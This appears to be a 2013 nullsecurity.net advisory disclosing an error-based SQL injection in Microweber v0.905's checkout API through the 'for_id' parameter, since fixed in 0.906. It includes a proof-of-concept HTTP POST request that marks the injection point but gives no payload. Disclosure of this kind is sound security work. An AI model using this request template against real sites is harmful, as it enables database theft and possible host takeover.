@@ -1,0 +1,96 @@
+===============================================================================
+|                                                                             |
+                         ____                     _ __
+              ___  __ __/ / /__ ___ ______ ______(_) /___ __
+             / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /
+            /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /
+                                                     /___/ team
+
+                          PUBLIC SECURITY ADVISORY
+|                                                                             |
+===============================================================================
+
+
+TITLE
+=====
+
+Microweber Error Based SQL Injection
+
+AUTHOR
+======
+
+Zy0d0x
+
+
+DATE
+====
+
+06/11/2013
+
+VENDOR
+======
+
+http://microweber.com/
+
+AFFECTED PRODUCT
+================
+
+Microweber v0.905 
+
+
+DESCRIPTION
+===========
+
+Input passed via the "for_id" parameter is not properly sanitised before being processed.
+This can be exploited to extract sensitive information from the database(s).
+ 
+
+PROOF OF CONCEPT
+================
+
+
+POST /microweber/api/checkout HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://localhost/microweber/checkout
+Content-Length: 352
+Cookie: last_page=checkout; mw-time3830699257=2013-11-06+10%3A11%3A31; helpinfo=false; PHPSESSID=rtip13vkbp1jrsij39ab4isui4
+Pragma: no-cache
+Cache-Control: no-cache
+
+=1&country=&first_name=test&last_name=test&email=test&phone=test&shipping_gw=shop%2Fshipping%2Fgateways%2Fcountry&for_id=shipping-info-checkout557478767[SQLI HERE]&for=module&City=test&State=test&Zip=test&Street=test&payment_gw=shop%2Fpayments%2Fgateways%2Fpaypal
+
+
+IMPACT
+======
+
+Injection can result in data loss or corruption, lack of accountability, or denial of access. 
+Injection can sometimes lead to complete host takeover.
+
+
+THREAT LEVEL
+============
+
+Critical
+
+
+STATUS
+======
+
+Fixed update to version 0.906
+
+
+DISCLAIMER
+==========
+
+nullsecurity.net hereby emphasize, that the information which is published here are
+for education purposes only. nullsecurity.net does not take any responsibility for
+any abuse or misusage!
+
+                Copyright (c) 2011 - nullsecurity.net
